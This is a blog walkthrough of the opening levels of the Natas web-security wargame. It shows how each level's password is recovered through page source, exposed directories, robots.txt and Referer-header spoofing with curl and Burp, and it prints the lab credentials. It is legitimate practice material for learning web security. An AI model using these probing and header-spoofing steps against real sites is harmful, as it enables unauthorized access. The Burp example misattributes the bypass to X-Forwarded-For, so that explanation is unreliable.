---
layout: post
title: Natas CTF Walkthrough
tags: CTF, Walkthrough, web challenges
---


I wanted to write about the the Natas web application CTF. Its a fun little CTF, and great for beginners. 

We can start off by reading the description hosted here at the NATAs website: 

URL:      http://natas0.natas.labs.overthewire.org

## Challenge 0 

For the first challenge, we're already provided the username and password. 

```
Username: natas0
Password: natas0
URL:      http://natas0.natas.labs.overthewire.org
```

## Challenge 1 

From here, we access the main page and are greeted with the message "You can find the password for the next level on this page." 

As a first, we always want to take a look at the source and find the password there. 


```
# line 16 
<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
```


## Challenge 2 

> You can find the password for the next level on this page, but rightclicking has been blocked!

Challenge 2 is similar and we can do it a few ways.  The claim " rightclicking has been disabled" isn't entirely true, since we're to do right-click in various browsers. 

But we'll honor the spirit of the challenge. 

**Method 1**

We can simply modify the url to `view-source:http://natas1.natas.labs.overthewire.org/`

**Method 2**

Using curl, via the command line, we can can use the -u flag to pass the credentials for the level and read the source: 


```
debian  ~  curl http://natas1.natas.labs.overthewire.org/ -u "natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto" | grep -i password
 
 You can find the password for the
<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->

```

## Challenge 3 

`http://natas2.natas.labs.overthewire.org`

login:  `natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi`

**Challenge:**
>There is nothing on this page 

Once again, we'll use our `view-source` super powers and take a look at what is going on on this page. 

The source appears normal, with the exeception of the "files" directory on line 15. 

```
There is nothing on this page
<img src="[files/pixel.png](view-source:http://natas2.natas.labs.overthewire.org/files/pixel.png)">
```

Navigating to the `/files` directory gives us a directory listing which contains the a `.txt`  file called `users.txt`.  Downloading or reading `users.txt`  provides us with usernames, which include the credentials for our next level. 

Contents of `http://natas2.natas.labs.overthewire.org/files/users.txt`

```

# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
eve:zo4mJWyNj2
mallory:9urtcpzBmH

```

## Challenge 4 

**Challenge:**

> There is nothing on this page

Once again, we're told nothing exists on the page, so we take a look at the source and are greeted with a small clue. 

```
<div id="content">
There is nothing on this page
<!-- No more information leaks!! Not even Google will find it this time... -->
</div>
```

This is helpful. After looking at the source, we take a look at what google would first use for indexing the site, `robots.txt`.  We find the following: 

```
# contents of robots.txt 
# natas3.natas.labs.overthewire.org/robots.txt


User-agent: *
Disallow: /s3cr3t/

```

We head over the to the `/s3cr3t` directory and a directory listing with the file `users.txt`. 

We read the contents of `users.txt` to get credentials for Level 5. 

```
#contents of users.txt 

natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

```

## Challenge 5 

**Challenge:**
>Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/index.php" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"  

We're provided a "refresh page" link. 

The "authorized users should come only from "http://natas5.natas.labs.overthewire.org/" is a great clue, and indicator that we might be able to easily bypass this page by manipulating the headers. 

We can do this a few ways. 

**Method 1**

We can intercept the request via burp and modify our `GET` request to to the following: 

```
GET /index.php HTTP/1.1
X-Forwarded-For: http://natas5.natas.labs.overthewire.org/
Host: natas4.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://natas4.natas.labs.overthewire.org/index.php
Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va
Connection: close
Upgrade-Insecure-Requests: 1

```
Here, we're simply abusing the `X-Forwarded-For`  header and adding the url provided in the challenge clue. 

**Method 2**

Once again, we can use curl to send our request: 

```
curl -H "Referer: http://natas5.natas.labs.overthewire.org/" -u "natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ" http://natas4.natas.labs.overthewire.org/index.php
```

Where `-H` modifies the `Referer:` header and we again use `-u` to pass our natas4 credentials. 

We get back the following: 

```
debian  curl -H "Referer: http://natas5.natas.labs.overthewire.org/" -u "natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ" http://natas4.natas.labs.overthewire.org/index.php | grep -i password

<--- snip --> 

Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq


```

I'll be updating this page as we progress through the challenges. 